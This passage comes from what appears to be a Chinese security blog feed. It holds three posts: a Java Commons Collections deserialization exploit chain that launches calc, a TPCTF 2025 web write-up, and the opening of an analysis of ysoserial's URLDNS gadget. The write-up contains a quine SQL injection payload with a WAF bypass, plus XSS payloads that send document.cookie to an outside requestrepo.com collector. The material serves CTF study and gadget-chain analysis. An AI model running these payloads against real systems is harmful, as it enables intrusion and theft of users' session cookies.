class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,</span><br><span class="line">                Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)</span><br><span class="line">                construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很长很绕，让自己来挖做不到<br>尤其是注解类，发现不了，审不明白<br>思路学一辈子</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tpctf2025</title>
      <link href="/2025/03/12/2025tpctf/"/>
      <url>/2025/03/12/2025tpctf/</url>
      
        <content type="html"><![CDATA[<h1 id="tpctf-web复现"><a href="#tpctf-web复现" class="headerlink" title="tpctf web复现"></a>tpctf web复现</h1><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>(<span class="params">request:HttpRequest</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;Welcome to TPCTF 2025&#x27;</span>)</span><br><span class="line">    username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;you are not admin.&#x27;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    users:AdminUser = AdminUser.objects.raw(<span class="string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> password == users[<span class="number">0</span>].password</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">&#x27;wrong password&#x27;</span>)</span><br></pre></td></tr></table></figure><p>根据这个flag接口判断<br>输入的密码要与查询出来的密码相同<br>所以要么想办法获得真正的密码<br>要么输出和查询语句一样的语句<br>这种注入叫做<code>quine注入</code><br>从基础示例理解:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,</span><br><span class="line">    <span class="type">char</span>(<span class="number">46</span>),</span><br><span class="line">    <span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure><p>但是实际payload要加很多东西来闭合<br>所以实际payload结构如下:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>, </span><br><span class="line">  REPLACE(</span><br><span class="line">    REPLACE(</span><br><span class="line">      <span class="string">&#x27;[Inner_String]&#x27;</span>, </span><br><span class="line">      <span class="type">CHAR</span>(<span class="number">34</span>), <span class="type">CHAR</span>(<span class="number">39</span>)</span><br><span class="line">    ), </span><br><span class="line">    <span class="type">CHAR</span>(<span class="number">36</span>), </span><br><span class="line">    <span class="string">&#x27;[Outer_String]&#x27;</span></span><br><span class="line">  ) <span class="operator">||</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>payload为</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT 1,2, </span></span><br><span class="line"><span class="string">    REPLACE(</span></span><br><span class="line"><span class="string">        REPLACE(&#x27;</span></span><br><span class="line">            &quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ,CHAR(34),CHAR(39)</span></span><br><span class="line"><span class="string">            ),</span></span><br><span class="line"><span class="string">            CHAR(36),</span></span><br><span class="line"><span class="string">            &#x27;</span>&quot; UNION SELECT 1,2, REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) || &quot;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    ) || &#x27;</span></span><br></pre></td></tr></table></figure><p>之后需要绕过go的一个waf<br>防的很严，需要用一个特性绕过<br>使其不解析<br><a href="https://blog.csdn.net/Thewei666/article/details/142408096">https://blog.csdn.net/Thewei666/article/details/142408096</a></p><p>数据流:</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>&quot;1564-5ee8764d17ec0&quot;</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Mon, 28 Nov 2022 12:56:03 </span><br><span class="line">Content-Type:multipart/form-data;boundary=----abcdefg</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>453</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;username&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">admin</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;; filename=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;password&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span><span class="string">&#x27; union select 1,2,replace(replace(&#x27;</span><span class="number">1</span>&quot; union select 1,2,replace(replace(&quot;#&quot;,char(34),char(39)),char(35),&quot;#&quot;)-- &#x27;,char(34),char(39)),char(35),&#x27;1&quot; <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,replace(replace(&quot;#&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">35</span>),&quot;#&quot;)<span class="comment">-- &#x27;)-- </span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------abcdefg--</span></span></span><br></pre></td></tr></table></figure><p>成功获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;testflag&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby-layout"></a>baby-layout</h3><p>本题利用<code>HTML属性注入</code>以及<code>事件驱动执行</code><br>payload:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;&quot;layout&quot;:&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;&#123;&#123;content&#125;&#125;&#x27;</span>&gt;</span>&quot;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;alert(1)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><p>这样的话就成了:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>往接收的网站弹即可</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;x\&quot; onerror=\&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>,<span class="string">&quot;layoutId&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe-layout"></a>safe-layout</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css">&#123;&#123;<span class="attribute">content</span>&#125;&#125;&lt;&#123;&#123;<span class="attribute">content</span>&#125;&#125;&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span><br></pre></td></tr></table></figure><p>实际上是这个效果:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">aa<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml">img src=&quot;<span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>&quot; onerror=&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;style&gt;&lt;/style&gt;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;fetch(&#x27;https://kpq5ma0x.requestrepo.com/?a=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>不管格式发生了什么，<br>只要有完整的img标签，就会触发请求<br>请求不到就onerror带出cookie</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—URLDNS 梦开始的地方</title>
      <link href="/2025/03/10/java-payload-URLDNS/"/>
      <url>/2025/03/10/java-payload-URLDNS/</url>
      
        <content type="html"><![CDATA[<p>看看ysoserial的payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>这条链子用于测试存不存在反序列化漏洞，<br>如果存在，那么会因为DNS被修改往某个恶意网站发送请求<br>如果接收到了请求就说明存在反序列化漏洞，可以进行后续操作</p><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><ul><li><h5 id="Hashmap"><a href="#Hashmap" class="headerlink" title="Hashmap"></a><code>Hashmap</code></h5></li></ul><p>类似于python的字典，用于存储键值对数据<br>看看<code>Hashmap</code>的<code>readObject</code>方法<br>如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.clamp(lf, <span class="number">0.25f</span>, <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">double</span> <span class="variable">dc</span> <span class="operator">=</span> Math.ceil(mappings / (<span class="type">double</span>)lf);</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (dc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="type">int</span>)dc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);<span class="comment">//41行在这</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第四十一行的位置触发了<code>hash()</code>函数运算<br>跟进此函数:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处是三目表达式<br>若key没有，则返回0<br>或key不为空，则调用key的hashcode方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>看来此方法跟对象有关<br>回头payload的<code>getObject</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); </span><br><span class="line">    ht.put(u, url);</span><br><span class="line"></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的是<code>hashmap</code>对象，<br>但调用的是<code>URL</code>对象的<code>hashCode</code>方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用的是<code>handler</code>(<code>URLStreamHandler</code>的对象) 的<code>hashCode</code>方法<br>跟进:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">        h += 